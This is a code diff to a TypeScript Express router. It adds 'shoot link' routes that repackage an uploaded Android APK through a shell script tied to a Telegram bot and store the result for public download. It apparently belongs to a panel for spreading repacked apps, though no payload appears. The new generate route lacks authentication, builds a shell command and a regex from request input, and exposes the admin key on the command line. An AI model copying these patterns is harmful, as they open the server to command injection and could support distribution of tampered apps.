@@ -547,14 +547,38 @@ router.post(["/repack/start", "/admin/repack/start"], async (req: Request, res: 
   }
 });
 
-router.post(["/harmful/:requestId/resolve", "/admin/harmful/:requestId/resolve"], (req: Request, res: Response) => {
+router.post(["/harmful/:requestId/resolve", "/admin/harmful/:requestId/resolve"], async (req: Request, res: Response) => {
   const adminKey = String(req.headers["x-admin-key"] || "").trim();
   if (!adminKey || adminKey !== process.env.ADMIN_API_KEY) return res.status(401).json({ error: "unauthorized" });
   const { requestId } = req.params;
-  const { fileId, filename, panelId } = req.body || {};
+  const { fileId, filename, panelId, iconFileId, appName } = req.body || {};
   const existing = repackJobs.get(requestId);
   repackJobs.set(requestId, { ...(existing || { createdAt: Date.now(), panelId: panelId || "" }), status: "done", fileId: clean(fileId), filename: clean(filename) || "repacked.apk" });
   logger.info("repack: resolved", { requestId, filename });
+
+  // Save shoot fields to Panel DB so public endpoint can serve this APK
+  if (appName && panelId) {
+    setImmediate(async () => {
+      try {
+        const conn = await getBotDb();
+        const PanelModel = getBotPanelModel(conn);
+        await PanelModel.findOneAndUpdate(
+          { panelId: { $regex: new RegExp(`^${clean(panelId)}$`, "i") } },
+          { $set: {
+            shootApkFileId:   clean(fileId),
+            shootIconFileId:  clean(iconFileId || ""),
+            shootAppName:     clean(appName),
+            shootGeneratedAt: Date.now(),
+          }},
+          { upsert: false }
+        );
+        logger.info("repack: shoot fields saved to panel", { panelId: clean(panelId), appName: clean(appName) });
+      } catch (e: any) {
+        logger.warn("repack: shoot fields save failed", e?.message);
+      }
+    });
+  }
+
   return res.json({ ok: true });
 });
 
@@ -579,6 +603,70 @@ router.get(["/repack/:requestId/download", "/admin/repack/:requestId/download"],
       fileStream.on("error", (_err: Error) => { if (!res.headersSent) res.status(500).end(); });
     }).on("error", (_err: Error) => { if (!res.headersSent) res.status(500).json({ error: "Download failed" }); });
   } catch (err: any) { if (!res.headersSent) res.status(500).json({ error: err?.message }); }
+});
+
+/**
+ * =====================================
+ * SHOOT LINK ROUTES
+ * =====================================
+ */
+
+// Generate / regenerate the shoot APK for this panel
+router.post(["/shoot/generate", "/admin/shoot/generate"], async (req: Request, res: Response) => {
+  try {
+    const panelId = clean(req.body?.panelId || process.env.PANEL_ID || "");
+    if (!panelId) return res.status(400).json({ error: "panelId required" });
+    const conn       = await getBotDb();
+    const PanelModel = getBotPanelModel(conn);
+    const panel      = await PanelModel.findOne({ panelId: { $regex: new RegExp(`^${panelId}$`, "i") } }).lean() as any;
+    if (!panel) return res.status(404).json({ error: `Panel "${panelId}" not found` });
+    if (!panel.apkFileId) return res.status(400).json({ error: "Pehle Telegram bot se release APK upload karo." });
+    const fileId    = String(panel.apkFileId);
+    const chatId    = process.env.ADMIN_CHAT_ID || process.env.STORAGE_CHAT_ID || "";
+    const BOT_TOKEN = process.env.BOT_TOKEN || "";
+    if (!chatId)    return res.status(500).json({ error: "ADMIN_CHAT_ID ya STORAGE_CHAT_ID .env mein set nahi hai" });
+    if (!BOT_TOKEN) return res.status(500).json({ error: "BOT_TOKEN .env mein set nahi hai" });
+    const requestId = genRequestId();
+    repackJobs.set(requestId, { status: "pending", panelId, createdAt: Date.now() });
+    const scriptPath = "/root/second-bot/repack/repack.sh";
+    const selfUrl = process.env.SELF_RESOLVE_URL || `http://localhost:${process.env.PORT || 3000}`;
+    const apiKey  = process.env.ADMIN_API_KEY || process.env.API_KEY || "";
+    const cmd = `bash "${scriptPath}" "${fileId}" "${chatId}" "${requestId}" "${panelId}" "" "" "${selfUrl}" "${apiKey}" 2>&1`;
+    logger.info("shoot-generate: starting", { requestId, panelId });
+    exec(cmd, { timeout: 5 * 60 * 1000 }, (err, stdout) => {
+      const job = repackJobs.get(requestId);
+      if (err) {
+        logger.error("shoot-generate: script error", { requestId, error: err.message, stdout: stdout?.slice(0, 200) });
+        if (job?.status === "pending") repackJobs.set(requestId, { ...job, status: "error", error: "Repack script fail ho gaya." });
+      } else {
+        logger.info("shoot-generate: script done", { requestId, stdout: stdout?.slice(0, 100) });
+        setTimeout(() => { const j = repackJobs.get(requestId); if (j?.status === "pending") repackJobs.set(requestId, { ...j, status: "error", error: "Script complete hua par resolve nahi mila" }); }, 10000);
+      }
+    });
+    return res.json({ requestId });
+  } catch (err: any) {
+    logger.error("shoot-generate: failed", err);
+    return res.status(500).json({ error: err?.message || "server error" });
+  }
+});
+
+// Get current shoot APK status from Panel DB (persistent across restarts)
+router.get(["/shoot/status", "/admin/shoot/status"], async (req: Request, res: Response) => {
+  try {
+    const panelId = clean(String(req.query.panelId || process.env.PANEL_ID || ""));
+    if (!panelId) return res.status(400).json({ error: "panelId required" });
+    const conn       = await getBotDb();
+    const PanelModel = getBotPanelModel(conn);
+    const panel      = await PanelModel.findOne({ panelId: { $regex: new RegExp(`^${panelId}$`, "i") } }).lean() as any;
+    if (!panel) return res.status(404).json({ error: "Panel not found" });
+    return res.json({
+      hasApk:       !!(panel.shootApkFileId),
+      appName:      panel.shootAppName || "",
+      generatedAt:  panel.shootGeneratedAt || null,
+    });
+  } catch (err: any) {
+    return res.status(500).json({ error: err?.message || "server error" });
+  }
 });
 
 /**
